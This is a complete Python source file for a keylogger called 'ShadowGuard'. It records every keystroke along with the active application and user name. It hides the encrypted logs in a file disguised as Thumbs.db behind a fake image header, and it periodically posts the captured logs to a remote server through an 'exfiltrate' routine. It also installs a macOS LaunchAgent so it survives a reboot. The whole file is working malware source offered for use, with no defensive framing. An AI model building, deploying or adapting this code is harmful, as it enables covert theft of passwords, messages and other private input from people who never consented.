# =============================================
# SHADOWGUARD.PY - FULL UNIFIED & CORRECTED VERSION
# Single file: Keylogger + Live GUI Dashboard + Decryption + Persistence
# Run: python shadowguard.py
# Features: Auto-GUI, F12 to stop, encrypted logs, cross-platform export
# Modification: Added current user detection; In-memory logs for faster GUI updates; Reduced GUI size to 800x600; Auto-scroll; Thread-safe queue for entries; Faster refresh (200ms); Flush before export
# =============================================
import os
import sys
import time
import json
import threading
import platform
import random
import subprocess
from datetime import datetime
from typing import List, Dict
from queue import Queue  # Added for thread-safe entry updates
# Optional deps
PC_MODE = False
try:
    from pynput import keyboard as pynput_keyboard
    from pynput.keyboard import Key, Listener as KeyboardListener
    PC_MODE = True
except ImportError:
    print("[WARN] pynput not installed - key capture disabled")
try:
    import psutil
except ImportError:
    psutil = None
# Crypto
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend
# GUI
import tkinter as tk
from tkinter import scrolledtext
# Exfil
import requests
# Add for robust user detection
import pwd
# =============================================
# CONFIG
# =============================================
PASSWORD = "UtkarshSecurePass123!"
SALT_FILE = os.path.expanduser("~/.shadow_salt")
LOG_FILE = os.path.expanduser("~/.config/Thumbs.db")
SERVER_URL = "https://your-server.com/log" # CHANGE THIS
EXFIL_INTERVAL = 3600
BUFFER_FLUSH = 256
FAKE_HEADER = b'\xFF\xD8\xFF'
XOR_KEY = b'sh4d0wGu4rd2025'
# Global
storage = None
listener = None
OS_TYPE = None
try:
    CURRENT_USER = pwd.getpwuid(os.getuid()).pw_name  # More robust user detection
except:
    CURRENT_USER = os.getlogin()  # Fallback
IN_MEMORY_LOGS = []  # In-memory list for fast GUI access
ENTRY_QUEUE = Queue()  # Thread-safe queue for new entries
# =============================================
# HELPERS
# =============================================
def xor_obfuscate(data: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(data, XOR_KEY * (len(data) // len(XOR_KEY) + 1)))
def detect_os() -> str:
    sys_os = platform.system()
    if sys_os == "Darwin": return "macOS"
    if sys_os == "Linux":
        try:
            with open("/proc/version") as f:
                if "Android" in f.read(): return "Android"
        except: pass
        return "Linux"
    if sys_os == "Windows": return "Windows"
    return "Unknown"
def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt,
                     iterations=100000, backend=default_backend())
    return kdf.derive(password.encode())
def generate_salt() -> bytes:
    if os.path.exists(SALT_FILE):
        with open(SALT_FILE, "rb") as f: return f.read()
    salt = os.urandom(16)
    with open(SALT_FILE, "wb") as f: f.write(salt)
    return salt
def encrypt_chunk(data: str, key: bytes) -> bytes:
    nonce = os.urandom(12)
    cipher = ChaCha20Poly1305(key)
    ct = cipher.encrypt(nonce, data.encode(), None)
    return FAKE_HEADER + xor_obfuscate(nonce + ct)
def decrypt_chunk(blob: bytes, key: bytes) -> str:
    try:
        if not blob.startswith(FAKE_HEADER):
            return "[INVALID]"
        payload = xor_obfuscate(blob[len(FAKE_HEADER):])
        nonce = payload[:12]
        ct = payload[12:]
        cipher = ChaCha20Poly1305(key)
        pt = cipher.decrypt(nonce, ct, None)
        return pt.decode(errors='replace')
    except:
        return "[CORRUPTED]"
# =============================================
# STORAGE
# =============================================
class LogStorage:
    def __init__(self):
        self.salt = generate_salt()
        self.key = derive_key(PASSWORD, self.salt)
        self.buffer: List[Dict] = []
        self.file_path = LOG_FILE
    def add_entry(self, entry: Dict):
        self.buffer.append(entry)
        ENTRY_QUEUE.put(entry)  # Put in queue for GUI
        if len(self.buffer) >= 10:  # Flush every 10 entries to file
            self.flush()
    def flush(self):
        if not self.buffer: return
        data = json.dumps(self.buffer)
        chunk = encrypt_chunk(data, self.key)
        with open(self.file_path, "ab") as f:
            f.write(chunk)
        if os.path.getsize(self.file_path) > 5_000_000:
            os.rename(self.file_path, f"{self.file_path}.{int(time.time())}")
        self.buffer.clear()
    def get_all_logs_from_file(self) -> List[Dict]:  # For export or exfil
        self.flush()  # Ensure buffer is flushed before reading
        if not os.path.exists(self.file_path):
            return []
        with open(self.file_path, "rb") as f:
            data = f.read()
        entries = []
        start = 0
        while True:
            pos = data.find(FAKE_HEADER, start)
            if pos == -1: break
            next_pos = data.find(FAKE_HEADER, pos + 3)
            chunk = data[pos:next_pos] if next_pos != -1 else data[pos:]
            try:
                dec = decrypt_chunk(chunk, self.key)
                chunk_entries = json.loads(dec)
                entries.extend(chunk_entries)
            except:
                pass
            start = next_pos if next_pos != -1 else len(data)
        return entries
# =============================================
# CAPTURE
# =============================================
def get_active_app():
    if platform.system() == "Darwin":
        try:
            script = 'tell application "System Events" to get name of (processes where frontmost is true)'
            result = subprocess.check_output(['osascript', '-e', script]).decode('utf-8').strip().strip('"')
            return result or "Unknown"
        except:
            pass
    if psutil:
        try:
            for proc in psutil.process_iter(['name']):
                name = proc.info.get('name', '').lower()
                if any(k in name for k in ['code', 'python', 'safari', 'terminal', 'chrome', 'firefox', 'word', 'excel']):
                    return proc.info.get('name', 'Unknown')
        except:
            pass
    return "Unknown"
def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') and key.char else str(key).replace('Key.', '')
        entry = {
            "ts": time.time(),
            "key": key_str,
            "app": get_active_app(),
            "user": CURRENT_USER
        }
        storage.add_entry(entry)
        print(f"🔥 KEY: [{key_str}] | App: {entry['app']} | User: {CURRENT_USER}")
    except:
        pass
def start_capture():
    global listener
    listener = KeyboardListener(on_press=on_press)
    listener.start()
    return listener
def periodic_flush():
    while True:
        time.sleep(5)
        storage.flush()
def exfiltrate():
    while True:
        time.sleep(EXFIL_INTERVAL + random.randint(-300, 300))
        if SERVER_URL != "https://your-server.com/log" and storage:
            try:
                logs = storage.get_all_logs_from_file()
                if logs:
                    requests.post(SERVER_URL, json={"data": logs}, timeout=8)
            except:
                pass
# =============================================
# PERSISTENCE (macOS)
# =============================================
def set_persistence():
    if OS_TYPE != "macOS": return
    plist_path = os.path.expanduser("~/Library/LaunchAgents/com.shadowguard.plist")
    script_path = os.path.abspath(sys.argv[0])
    content = f'''<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key><string>com.shadowguard</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>'''
    try:
        with open(plist_path, "w") as f:
            f.write(content)
        subprocess.run(["launchctl", "load", plist_path], check=False)
    except:
        pass
# =============================================
# GUI
# =============================================
class KeyloggerViewer:
    def __init__(self, listener=None):
        self.listener = listener
        self.root = tk.Tk()
        self.root.title("ShadowGuard Live Dashboard")
        self.root.geometry("800x600")
        
        tk.Label(self.root, text="SHADOWGUARD LIVE KEYLOGGER",
                font=("Courier", 22, "bold"), fg="#00ff41", bg="#0a0a0a").pack(pady=20)
        
        self.status = tk.Label(self.root, text=f"Monitoring User: {CURRENT_USER}... Last update: Never",
                              font=("Courier", 12), fg="#00cc00", bg="#0a0a0a")
        self.status.pack(pady=10)
        
        self.log_area = scrolledtext.ScrolledText(self.root, height=20, bg="#1a1a1a",
                                                 fg="#00ff88", font=("Courier", 11), wrap=tk.WORD)
        self.log_area.pack(padx=25, pady=10, fill=tk.BOTH, expand=True)
        
        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
        btn_frame.pack(pady=15)
        tk.Button(btn_frame, text="🔄 REFRESH", command=self.refresh, bg="#00cc00", fg="black", width=18, height=2).pack(side=tk.LEFT, padx=15)
        tk.Button(btn_frame, text="🛑 STOP", command=self.stop_button_clicked, bg="#ff4444", fg="white", width=18, height=2).pack(side=tk.LEFT, padx=15)
        tk.Button(btn_frame, text="💾 EXPORT", command=self.export, bg="#4488ff", fg="white", width=18, height=2).pack(side=tk.LEFT, padx=15)
        
        self.refresh()
        self.root.after(200, self.auto_refresh)  # Even faster: 200ms
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.mainloop()
    
    def format_entry(self, entry):
        try:
            ts = datetime.fromtimestamp(entry.get('ts', 0)).strftime('%H:%M:%S')
            key = entry.get('key', '?')
            app = entry.get('app', 'Unknown')
            user = entry.get('user', 'Unknown')
            return f"{ts} | {key:<10} | {app} | {user}"
        except:
            return str(entry)
    
    def get_logs(self):
        try:
            entries = IN_MEMORY_LOGS[:]
            if not entries:
                return "No keys captured yet. Start typing!"
            formatted = [self.format_entry(e) for e in entries]
            return "\n".join(formatted[-100:])
        except Exception as e:
            return f"Error fetching logs: {str(e)}"
    
    def refresh(self):
        # Pull from queue thread-safely
        while not ENTRY_QUEUE.empty():
            IN_MEMORY_LOGS.append(ENTRY_QUEUE.get())
        logs = self.get_logs()
        self.log_area.delete(1.0, tk.END)
        self.log_area.insert(tk.END, logs)
        self.log_area.see(tk.END)
        self.status.config(text=f"Live • {len(IN_MEMORY_LOGS)} entries • {datetime.now().strftime('%H:%M:%S')} • User: {CURRENT_USER}")
    
    def auto_refresh(self):
        self.refresh()
        self.root.after(200, self.auto_refresh)
    
    def stop_button_clicked(self):
        if self.listener:
            try:
                self.listener.stop()
                self.status.config(text="Keylogger STOPPED. Closing in 2s...")
                self.root.after(2000, self.root.quit)
            except:
                self.root.quit()
        else:
            self.status.config(text="No keylogger running.")
    
    def on_close(self):
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
        self.root.destroy()
    
    def export(self):
        try:
            storage.flush()  # Extra flush before getting logs
            entries = storage.get_all_logs_from_file()
            with open("captured_keys.txt", "w", encoding="utf-8") as f:
                f.write(f"SHADOWGUARD CAPTURED KEYS for User: {CURRENT_USER}\n")
                f.write("="*50 + "\n\n")
                for e in entries:
                    f.write(self.format_entry(e) + "\n")
            # Cross-platform open
            try:
                if platform.system() == "Windows":
                    os.startfile("captured_keys.txt")
                elif platform.system() == "Darwin":
                    subprocess.Popen(["open", "captured_keys.txt"])
                else:
                    subprocess.Popen(["xdg-open", "captured_keys.txt"])
            except:
                print("Saved to captured_keys.txt (could not auto-open)")
        except Exception as e:
            print(f"Export error: {e}")
# =============================================
# MAIN
# =============================================
if __name__ == "__main__":
    storage = LogStorage()
    OS_TYPE = detect_os()
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    set_persistence()
    
    if PC_MODE:
        print(f"✅ ShadowGuard started on {OS_TYPE} for User: {CURRENT_USER}")
        print("→ Keys captured live in GUI. F12 in terminal to stop.")
        print("→ GUI opens automatically.\n")
        
        listener = start_capture()
        threading.Thread(target=periodic_flush, daemon=True).start()
        threading.Thread(target=exfiltrate, daemon=True).start()
        
        # F12 stop (terminal)
        def stop_hotkey():
            def on_press(key):
                if key == Key.f12:
                    print("→ F12: Stopping keylogger...")
                    listener.stop()
                    sys.exit(0)
            with KeyboardListener(on_press=on_press) as sl:
                sl.join()
        threading.Thread(target=stop_hotkey, daemon=True).start()
        
        KeyloggerViewer(listener) # GUI + live capture
    else:
        print("❌ No pynput - GUI only (no capture)")
        KeyloggerViewer()